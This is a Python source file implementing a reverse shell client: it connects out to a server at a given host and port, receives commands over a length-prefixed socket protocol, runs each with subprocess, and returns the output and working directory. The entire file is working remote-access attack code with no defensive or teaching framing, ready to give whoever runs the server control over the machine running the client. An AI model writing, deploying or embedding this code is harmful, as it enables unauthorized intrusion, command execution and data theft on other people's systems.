import os
import select
import socket
import shlex
import subprocess
import sys


class ShellClient:
    """Class used to create and control a reverse shell client"""
    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.ENCODING = 'utf-8'
        self.HEADER_LENGTH = 10

        self.connection = []

        self.client_socket = None

    def _receive_command(self):
        """Parses command data sent from the server"""
        try:
            command_header = self.client_socket.recv(self.HEADER_LENGTH)

            if not command_header:
                return None

            command_length = int(command_header.decode(self.ENCODING).strip())
            command = self.client_socket.recv(command_length)
            command = command.decode(self.ENCODING)

            return command

        except:
            return None

    def _send_response(self, sock, message):
        """Send the output of a client command to the server"""
        # Form the response header
        response_header = f"{len(message): <{self.HEADER_LENGTH}}".encode(self.ENCODING)
        response = message.encode(self.ENCODING)

        # Send of the command data to the client
        sock.send(response_header + response)

    def connect(self):
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.host, self.port))
            self.client_socket.setblocking(True)

            self.connection = [self.client_socket]

        except ConnectionRefusedError:
            print("\n[!] Server unavailable. Are you sure it is running?\n")
            sys.exit()

        while True:
            # Now begin receiving commands
            command_stream = self._receive_command()

            if not command_stream:
                print("Connection closed from server. Exiting...")
                self.client_socket.close()
                sys.exit()

            # Parse the command stream fo arguments
            args = shlex.split(command_stream)

            # Check for built-in commands
            if args[0] == 'cd':
                os.chdir(args[1])
                print(os.getcwd() + '> ')

            if command_stream:
                cmd = subprocess.Popen(args, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # Form the byte output
                output = cmd.stdout.read() + cmd.stderr.read()

                # Convert this into a string
                output = output.decode(self.ENCODING)
                output = output + str(os.getcwd()) + '> '

                # Send this response to the server
                self._send_response(self.client_socket, output)